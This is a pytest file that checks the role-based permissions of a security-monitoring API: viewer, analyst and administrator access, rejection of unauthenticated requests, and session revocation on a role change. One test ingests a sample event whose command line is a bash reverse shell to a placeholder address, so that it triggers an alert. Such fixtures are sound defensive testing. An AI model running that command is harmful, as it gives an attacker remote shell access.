"""The backend enforces every permission; these tests never rely on UI behaviour."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from tests.conftest import Api, event, ingest, login, make_user


@pytest.fixture
def clients(app_client: TestClient, db: Session) -> dict[str, Api]:
    result = {}
    for role in ("viewer", "analyst", "administrator"):
        client = TestClient(app_client.app, base_url="http://testserver")
        result[role] = login(client, make_user(db, role).email)
    return result


@pytest.mark.parametrize(
    ("method", "path", "body", "allowed"),
    [
        ("get", "/api/v1/events", None, {"viewer", "analyst", "administrator"}),
        ("get", "/api/v1/alerts", None, {"viewer", "analyst", "administrator"}),
        ("get", "/api/v1/detections/rules", None, {"viewer", "analyst", "administrator"}),
        ("post", "/api/v1/agents", {"name": "rbac-agent"}, {"administrator"}),
        (
            "post",
            "/api/v1/users",
            {
                "email": "n@aegis.lab",
                "display_name": "New User",
                "role": "viewer",
                "password": "long enough passphrase",
            },
            {"administrator"},
        ),
        ("get", "/api/v1/audit", None, {"administrator"}),
        ("get", "/api/v1/users", None, {"analyst", "administrator"}),
        ("post", "/api/v1/incidents", {"title": "Manual incident"}, {"analyst", "administrator"}),
        ("post", "/api/v1/demo/reset", None, {"analyst", "administrator"}),
        (
            "patch",
            "/api/v1/detections/rules/aegis-lnx-reverse-shell",
            {"enabled": False, "reason": "rbac test"},
            {"administrator"},
        ),
    ],
)
def test_permission_matrix(
    clients: dict[str, Api],
    method: str,
    path: str,
    body: dict[str, object] | None,
    allowed: set[str],
) -> None:
    for role, api in clients.items():
        kwargs = {"json": body} if body is not None else {}
        response = getattr(api, method)(path, **kwargs)
        if role in allowed:
            assert response.status_code < 400, (role, path, response.text)
        else:
            assert response.status_code == 403, (role, path, response.status_code)


def test_unauthenticated_requests_are_rejected(app_client: TestClient) -> None:
    for path in (
        "/api/v1/events",
        "/api/v1/alerts",
        "/api/v1/incidents",
        "/api/v1/dashboard",
        "/api/v1/auth/me",
        "/api/v1/graph",
    ):
        assert app_client.get(path).status_code == 401, path


def test_viewer_cannot_triage_or_change_incidents(
    clients: dict[str, Api], app_client: TestClient, agent_token: str
) -> None:
    shell = {
        "pid": 9,
        "name": "bash",
        "executable": "/usr/bin/bash",
        "command_line": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
    }
    ingest(app_client, agent_token, [event(process=shell)])
    viewer = clients["viewer"]
    alert = viewer.get("/api/v1/alerts").json()["items"][0]
    assert (
        viewer.patch(f"/api/v1/alerts/{alert['id']}", json={"status": "closed"}).status_code == 403
    )
    assert (
        viewer.patch(
            f"/api/v1/incidents/{alert['incident_id']}", json={"status": "resolved"}
        ).status_code
        == 403
    )
    analyst = clients["analyst"]
    assert (
        analyst.patch(f"/api/v1/alerts/{alert['id']}", json={"status": "acknowledged"}).status_code
        == 200
    )


def test_role_change_revokes_existing_sessions(clients: dict[str, Api], db: Session) -> None:
    admin = clients["administrator"]
    analyst = clients["analyst"]
    me = analyst.get("/api/v1/auth/me").json()
    assert admin.patch(f"/api/v1/users/{me['id']}", json={"role": "viewer"}).status_code == 200
    assert analyst.get("/api/v1/auth/me").status_code == 401


def test_admin_cannot_demote_self(clients: dict[str, Api]) -> None:
    admin = clients["administrator"]
    me = admin.get("/api/v1/auth/me").json()
    assert admin.patch(f"/api/v1/users/{me['id']}", json={"role": "viewer"}).status_code == 409
